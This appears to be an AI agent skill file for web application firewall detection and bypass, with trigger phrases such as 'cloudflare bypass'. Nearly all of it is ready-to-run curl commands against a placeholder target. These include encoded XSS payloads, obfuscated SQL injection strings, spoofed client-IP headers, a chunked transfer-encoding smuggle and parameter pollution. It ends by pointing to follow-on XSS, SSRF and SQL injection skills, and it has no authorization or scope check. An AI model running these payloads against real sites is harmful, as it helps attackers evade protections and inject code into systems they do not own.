---
name: vuln-waf-bypass
description: "WAF detection and bypass techniques — WAF fingerprinting, encoding bypass, case manipulation, header smuggling past WAF, chunked encoding, parameter pollution, Unicode normalization bypass. Triggers: 'waf bypass', 'waf detection', 'firewall bypass', 'web application firewall', 'waf evasion', 'cloudflare bypass', 'modsecurity bypass', 'waf fingerprint', 'bypass protection'."
---

# WAF Detection & Bypass

Fingerprint WAF and apply bypass techniques for injection testing past protections.

---

## Phase 1: WAF Detection

```bash
TARGET="https://TARGET"

pip3 install wafw00f 2>/dev/null
wafw00f "$TARGET" 2>&1 | tee output/waf_detect.txt

curl -s -I "$TARGET/?q=<script>alert(1)</script>" | grep -iE "server|x-powered-by|cf-|x-sucuri|x-amzn"
# 403 from WAF vs 404 from app = WAF detected

curl -s -I "$TARGET/" | grep -i "CF-RAY\|__cfduid\|cloudflare"

curl -s -I "$TARGET/" | grep -i "AkamaiGHost\|X-Check-Cacheable"

curl -s -I "$TARGET/?q='OR+1=1--" | grep "x-amzn-requestid"
```

---

## Phase 2: Encoding Bypass

```bash
TARGET="https://TARGET"
PARAM="q"

curl -s "$TARGET/search?$PARAM=%253Cscript%253Ealert(1)%253C/script%253E"

curl -s "$TARGET/search?$PARAM=%EF%BC%9Cscript%EF%BC%9E"

curl -s "$TARGET/search?$PARAM=%3Cimg+src%3Dx+onerror%3D%26%23097%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%2849%29%3E"

curl -s "$TARGET/search?$PARAM=1/**/UNION/**/SELECT/**/NULL"

curl -s "$TARGET/search?$PARAM=1%09UNION%09SELECT%09NULL,NULL"

curl -s "$TARGET/search?$PARAM=1+uNiOn+SeLeCt+NULL"
```

---

## Phase 3: Header-Based Bypass

```bash
TARGET="https://TARGET"

BYPASS_HEADERS=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Real-IP: 127.0.0.1"
  "X-Remote-IP: 127.0.0.1"
  "X-Remote-Addr: 127.0.0.1"
  "X-Originating-IP: 127.0.0.1"
  "X-Client-IP: 127.0.0.1"
  "X-Custom-IP-Authorization: 127.0.0.1"
  "X-ProxyUser-Ip: 127.0.0.1"
)

for H in "${BYPASS_HEADERS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "$H" "$TARGET/?id=1+union+select+null,null--")
  echo "$H → $STATUS"
done | tee output/waf_header_bypass.txt

curl -s -X POST "$TARGET/api/search" \
  -H "Content-Type: text/xml" \
  -d '<root><param>1 UNION SELECT NULL</param></root>'
```

---

## Phase 4: Chunked Transfer Bypass

```bash
TARGET="https://TARGET"

curl -s -X POST "$TARGET/api/search" \
  -H "Content-Type: application/json" \
  -H "Transfer-Encoding: chunked" \
  --data-raw $'8\r\n{"q":"1\r\n16\r\n UNION SELECT NULL--"}\r\n0\r\n\r\n'

curl -s "$TARGET/search?q=safe&q=<script>alert(1)</script>"
curl -s -X POST "$TARGET/search" -d "q=safe&q=<script>alert(1)</script>"
```

---

## Output

Save to `output/`:
- `waf_detect.txt` — WAF type and version
- `waf_header_bypass.txt` — header bypass results
- `waf_bypass_payloads.txt` — successful bypass payloads

## Next Phase

→ Use bypass techniques with `vuln-xss`, `vuln-ssrf`, or SQL injection skills
